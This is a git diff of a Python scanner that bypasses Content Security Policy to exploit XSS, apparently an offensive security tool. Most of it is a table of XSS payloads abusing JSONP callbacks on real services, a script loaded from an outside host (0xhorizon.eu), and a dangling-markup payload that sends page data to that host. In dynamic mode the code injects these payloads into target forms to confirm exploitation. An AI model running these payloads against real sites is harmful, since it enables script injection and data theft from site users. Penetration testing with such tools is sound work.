@@ -9,7 +9,6 @@ from selenium.webdriver.firefox.options import Options as FirefoxOptions
 from urllib.parse import urljoin, urlparse
 import argparse
 import datetime
-import random
 import re
 import selenium
 import time
@@ -18,9 +17,10 @@ general_payload = "document.write(atob('PHAgaWQ9dGVzdGluZ19qc19leHBsb2l0X3BhcmFt
 
 vulnerable_CSP_conf = {
     "script-src" : [
-        {'value': 'https://unsafe-inline', 'payload': f'<script>{general_payload}</script>'},
-        {'value': 'https://*', 'payload': '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'},
-        {'value': 'https://data:', 'payload': f'<script src="data:,{general_payload}"></script>'}
+        {'value': 'unsafe-inline', 'payload': f'<script>{general_payload}</script>'},
+        {'value': 'unsafe-inline', 'payload': f'<img src=# onerror={general_payload}>'},
+        {'value': '*', 'payload': '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'},
+        {'value': 'data:', 'payload': f'<script src="data:,{general_payload}"></script>'}
     ],
     "default-src": [
         {'value': 'https://*.google.com', 'payload': f'"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback={general_payload}"></script>'},
@@ -30,30 +30,30 @@ vulnerable_CSP_conf = {
         {'value': 'https://*.google.com', 'payload': f'"><script src="https://accounts.google.com/o/oauth2/revoke?callback={general_payload}"></script>'},
         {'value': 'https://*.blogger.com', 'payload': f'"><script src="https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback={general_payload}"></script>'},
         {'value': 'https://*.yandex.net', 'payload': f'"><script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback={general_payload}"></script>'},
-        {'value': 'https://*.yandex.ru', 'payload': f'"><script src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert"></script>'},
+        {'value': 'https://*.yandex.ru', 'payload': f'"><script src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback={general_payload}"></script>'},
         {'value': 'https://*.vk.com', 'payload': f'"><script src="https://api.vk.com/method/wall.get?callback={general_payload}"></script>'},
-        {'value': 'https://*.marketo.com', 'payload': f'"><script src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>'},
-        {'value': 'https://*.marketo.com', 'payload': f'"><script src="http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>'},
+        {'value': 'https://*.marketo.com', 'payload': f'"><script src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback={general_payload}"></script>'},
+        {'value': 'https://*.marketo.com', 'payload': f'"><script src="http://app-e.marketo.com/index.php/form/getKnownLead?callback={general_payload}"></script>'},
         {'value': 'https://*.alicdn.com', 'payload': f'"><script+src="https://detector.alicdn.com/2.7.3/index.php?callback={general_payload}"></script>'},
         {'value': 'https://*.taobao.com', 'payload': f'"><script+src="https://suggest.taobao.com/sug?callback={general_payload}"></script>'},
         {'value': 'https://*.tbcdn.cn', 'payload': f'"><script+src="https://count.tbcdn.cn//counter3?callback={general_payload}"></script>'},
         {'value': 'https://*.1688.com', 'payload': f'"><script+src="https://bebezoo.1688.com/fragment/index.htm?callback={general_payload}"></script>'},
         {'value': 'https://*.amap.com', 'payload': f'"><script+src="https://wb.amap.com/channel.php?callback={general_payload}"></script>'},
-        {'value': 'https://*.sm.cn', 'payload': f'"><script+src="http://a.sm.cn/api/getgamehotboarddata?format=jsonp&page=1&_=1537365429621&callback=confirm(1);jsonp1"></script>'},
-        {'value': 'https://*.sm.cn', 'payload': f'"><script+src="http://api.m.sm.cn/rest?method=tools.sider&callback=jsonp_1869510867%3balert(1)%2f%2f794"></script>'},
-        {'value': 'https://*.uber.com', 'payload': f'"><script+src="https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);"></script>'},
-        {'value': 'https://*.buzzfeed.com', 'payload': f'"><script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>'},
+        {'value': 'https://*.sm.cn', 'payload': f'"><script+src="http://a.sm.cn/api/getgamehotboarddata?format=jsonp&page=1&_=1537365429621&callback={general_payload};jsonp1"></script>'},
+        {'value': 'https://*.sm.cn', 'payload': f'"><script+src="http://api.m.sm.cn/rest?method=tools.sider&callback=jsonp_1869510867%3b{general_payload}%2f%2f794"></script>'},
+        {'value': 'https://*.uber.com', 'payload': f'"><script+src="https://mkto.uber.com/index.php/form/getKnownLead?callback={general_payload};"></script>'},
+        {'value': 'https://*.buzzfeed.com', 'payload': f'"><script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback={general_payload}%2f%2f"></script>'},
         {'value': 'https://*.co.jp', 'payload': f'"><script src=https://mempf.yahoo.co.jp/offer?position=h&callback={general_payload}//></script>'},
         {'value': 'https://*.yahooapis.jp', 'payload': f'"><script src=https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback={general_payload}//&appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-></script>'},
-        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>'},
-        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfolios&porttype=2&portmax=5&rf=http://www.dailyfinance.com&callback=jsonCallback24098%3balert(1)%2f%2f476&_=1537149044679"></script>'},
-        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://api.cmi.aol.com/content/alert/homepage-alert?site=usaol&callback=confirm(1);//jQuery20108887725116629929_1528071050373472232&_=1528071050374"></script>'},
-        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://api.cmi.aol.com/catalog/cms/help-central-usaol-navigation-utility?callback=confirm(1);//jQuery20108887725116629929_152807105037740504&_=1528071050378"></script>'},
-        {'value': 'https://*.yahoo.com', 'payload': f'">x<script+src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>'},
-        {'value': 'https://*.yahoo.com', 'payload': f'"><script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>'},
-        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>'},
-        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooter&channel=finance&portfolios=true&domain=portfolios&collapsed=1&callback=confirm(9)//jQuery21307555521146732187_1538371213486&_=1538371213487"></script>'},
-        {'value': 'https://*.aol.com', 'payload': f'"><script+src="http://portal.pf.aol.com/jsonmfus/?service=myportfolios,&porttype=1&portmax=100&callback=confirm(9)//jQuery1710788849030856973_1538354104695&_=1538354109053"></script>'},
+        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback={general_payload}//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>'},
+        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfolios&porttype=2&portmax=5&rf=http://www.dailyfinance.com&callback=jsonCallback24098%3b{general_payload}%2f%2f476&_=1537149044679"></script>'},
+        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://api.cmi.aol.com/content/alert/homepage-alert?site=usaol&callback={general_payload};//jQuery20108887725116629929_1528071050373472232&_=1528071050374"></script>'},
+        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://api.cmi.aol.com/catalog/cms/help-central-usaol-navigation-utility?callback={general_payload};//jQuery20108887725116629929_152807105037740504&_=1528071050378"></script>'},
+        {'value': 'https://*.yahoo.com', 'payload': f'">x<script+src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb={general_payload};"></script>'},
+        {'value': 'https://*.yahoo.com', 'payload': f'"><script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback={general_payload}"></script>'},
+        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback={general_payload}//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>'},
+        {'value': 'https://*.aol.com', 'payload': f'"><script+src="https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooter&channel=finance&portfolios=true&domain=portfolios&collapsed=1&callback={general_payload}//jQuery21307555521146732187_1538371213486&_=1538371213487"></script>'},
+        {'value': 'https://*.aol.com', 'payload': f'"><script+src="http://portal.pf.aol.com/jsonmfus/?service=myportfolios,&porttype=1&portmax=100&callback={general_payload}//jQuery1710788849030856973_1538354104695&_=1538354109053"></script>'},
         {'value': 'https://*.twitter.com', 'payload': f'"><script+src="http://search.twitter.com/trends.json?callback={general_payload}"></script>'},
         {'value': 'https://*.twitter.com', 'payload': f'"><script+src="https://twitter.com/statuses/user_timeline/yakumo119info.json?callback={general_payload}"></script>'},
         {'value': 'https://*.twitter.com', 'payload': f'"><script+src="https://twitter.com/status/user_timeline/kbeautysalon.json?count=1&callback={general_payload}"></script>'},
@@ -67,8 +67,8 @@ vulnerable_CSP_conf = {
         {'value': 'https://*.youku.com', 'payload': f'"><script+src="https://www.youku.com/index_cookielist/s/jsonp?callback={general_payload}"></script>'},
         {'value': 'https://*.mixpanel.com', 'payload': f'"><script+src="https://api.mixpanel.com/track/?callback={general_payload}"></script>'},
         {'value': 'https://*.travelpayouts.com', 'payload': f'"><script+src="https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback={general_payload}"></script>'},
-        {'value': 'https://*.pictela.net', 'payload': f'"><script+src="http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback=alert(1);/json"></script>'},
-        {'value': 'https://*.adtechus.com', 'payload': f'"><script+src="https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38"></script>'},
+        {'value': 'https://*.pictela.net', 'payload': f'"><script+src="http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback={general_payload};/json"></script>'},
+        {'value': 'https://*.adtechus.com', 'payload': f'"><script+src="https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback={general_payload};//window.proper_d31c1edc_57a8d6de_38"></script>'},
         {'value': 'https://*.googleapis.com', 'payload': '"><embed src=\'//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain="})))}catch(e){%s}//\' allowscriptaccess=always>' % general_payload},
         {'value': 'https://*.googleapis.com', 'payload': f'"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>'},
         {'value': 'https://*.googleapis.com', 'payload': f'ng-app"ng-csp ng-click=$event.view.{general_payload}><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>'},
@@ -77,40 +77,6 @@ vulnerable_CSP_conf = {
 
 def date_formatted():
     return datetime.datetime.now().strftime("%H:%M:%S")
-
-# def get_jsonp(policy):
-#     sess = HTMLSession()
-#     jsonbee = sess.get("https://raw.githubusercontent.com/zigoo0/JSONBee/master/jsonp.txt").text.splitlines()
-#     r = re.compile(r"(\w+\.\w+)")
-#     url = r.search(policy).group(1)
-#     endpoints = []
-#     for line in jsonbee:
-#         if url in line:
-#             endpoint = re.search('src="(.+)"', line).group(1)
-#             endpoints.append(re.sub(r"(?<=callback=).*$", general_payload, endpoint))
-#     return endpoints
-
-def construct_payloads(payload:str, jsonp=[]):
-    constructed = []
-
-    # Case Modify
-    modified = payload
-    tags = re.findall(r"(<.\w+\W)", payload)
-    for tag in tags:
-        modified = modified.replace(tag, tag.upper())
-    constructed.append(modified)
-
-    # Tag modified
-    r = re.compile(r"<script>(.+)</script>")
-    js = r.search(payload)
-    if js is not None:
-        constructed.append(f"<img src=# onerror={js.group(1)}>")
-
-    # All jsonp endpoints
-    for endpoint in jsonp:
-        constructed.append(f'<script src={endpoint}></script>')
-        
-    return constructed
 
 class Scanner:
     def __init__(self, target, no_colors=False, dynamic=False, all_pages=False):
@@ -163,6 +129,7 @@ class Page:
         self.sess = HTMLSession()
         self.csp = self.get_csp()
         self.jsonp = []
+        self.vulns = {}
 
     def get_csp(self):
         data = {}
@@ -187,20 +154,17 @@ class Page:
         return []
 
     def scan(self):
+        vuln = False
         for policyname in self.csp.keys():
             if policyname in vulnerable_CSP_conf.keys():
                 for exploit in vulnerable_CSP_conf[policyname]:
                     for policyvalue in self.csp[policyname]:
                         if exploit['value'] == policyvalue:
-                            self.vuln = policyname
-                            print(policyname, policyvalue)
-                            # if "jsonp" in exploit['payload']:
-                            #     self.jsonp = get_jsonp(policyname)
-                            #     exploit = exploit.replace("jsonp", random.choice(self.jsonp))
-                            self.payload = exploit['payload']
-                            # TODO: return or edit object attribute with list of found vulns
-                            return True
-        return False
+                            self.vulns[f"{policyname} {policyvalue}"] = exploit['payload']
+                            vuln = True
+        return vuln
+                            
+                            
             
 class Form:
     def __init__(self, url, action, method, names):
@@ -271,7 +235,6 @@ def parse_args():
 if __name__ == '__main__':
     args = parse_args()
     scan = Scanner(target=args.target, no_colors=args.no_colors, dynamic=args.dynamic, all_pages=args.all_pages)
-
     scan.info(f"Starting scan on target {scan.target}\n")
     
     if scan.all_pages:
@@ -294,38 +257,31 @@ if __name__ == '__main__':
                     scan.info("Parameter reflected in DOM and no htmlspecialchars detected")
                     if page.csp != []:
                         if page.scan():
-                            scan.vuln(f"Potential vulnerability found: {page.vuln}")
-                            scan.vuln(f"Potential payload found: {page.payload}\n")
+                            vulns = page.vulns.items()
+                            scan.info(f"Number of vulnerabilities found: {len(vulns)}\n")
+                            for vuln_policy, vuln_payload in vulns:
+                                scan.vuln(f"Vulnerability: {vuln_policy}")
+                                scan.vuln(f"Payload: {vuln_payload}\n")
                             if scan.dynamic:
-                                scan.info(f"Starting dynamic mode...")
-                                exploitable = False
-                                if new_form.exploit(page.payload):
-                                    exploitable = True
-                                    payload = page.payload
-                                else:
-                                    scan.fail("Potential exploit failed")
-                                    scan.info("Trying payload construction...")
-                                    payloads_constructed = construct_payloads(page.payload, page.jsonp)
-                                    for payload_generated in payloads_constructed:
-                                        if new_form.exploit(payload_generated):
-                                            exploitable = True
-                                            payload = payload_generated
-                                            break
-                                if exploitable:
-                                    scan.succeed(f"Payload found on {page.url}")
-                                    scan.succeed(f"Payload: {payload}\n")
-                                else:
-                                    scan.fail("No XSS found\n")
-                            else:
-                                scan.info("Use -d/--dynamic flag to use the dynamic scan")
+                                scan.info(f"Starting dynamic mode ...")
+                                for vuln_policy, vuln_payload in vulns:
+                                    scan.info(f"Testing: {vuln_policy}")
+                                    if new_form.exploit(vuln_payload):
+                                        scan.succeed(f"Payload found on {page.url}")
+                                        scan.succeed(f"Payload: {vuln_payload}\n")
+                                    else:
+                                        scan.fail("No working payload found\n")
                         else:
                             scan.fail(f"No XSS found\n")
-                            scan.info("Perhaps you can exploit Dangling Markup")
                             if scan.dynamic:
-                                scan.info("Trying exploiting Dangling Markup...")
+                                scan.info("Testing Dangling Markup ...")
                                 dangling_markup_payload = "<meta http-equiv=\"refresh\" content='0; url=https://0xhorizon.eu?data="
                                 if new_form.exploit(dangling_markup_payload, True):
                                     scan.succeed(f"Dangling markup payload found: {dangling_markup_payload}\n")
+                                else:
+                                    scan.fail("No dangling markup detected\n")
+                            else:
+                                scan.info("Perhaps you can exploit Dangling Markup")
                     else:
                         scan.fail(f"No CSP on page {page.url}\n")
                 else:
